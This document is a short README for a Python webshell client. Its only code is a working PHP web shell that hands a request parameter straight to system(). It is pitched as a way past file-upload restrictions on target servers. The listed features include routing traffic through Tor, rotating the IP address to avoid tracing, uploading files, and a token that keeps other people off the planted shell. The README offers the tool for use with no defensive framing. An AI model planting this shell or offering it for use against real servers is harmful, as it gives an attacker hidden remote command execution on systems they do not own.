# Webshell client

A webshell client written in python.

Only works well for linux for the time being.

## Why?

Because there are too many heavy webshells. Sometimes there are restrictions in the file upload and heavy webshells won't work. By having a simple webshell and emulating from the client you can have a full featured webshell by having a remote shell like:

```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```


## Features

- Supports POST/GET requests
- Supports token-password so that you can loosely protect from others performing requests on your webshell
- Supports the tor service and the tor-control service
   - Perform requests behind tor
   - Renew IP using the tor-control service
- Configuration file
- Command history
- File upload

## Configuration

To be documented
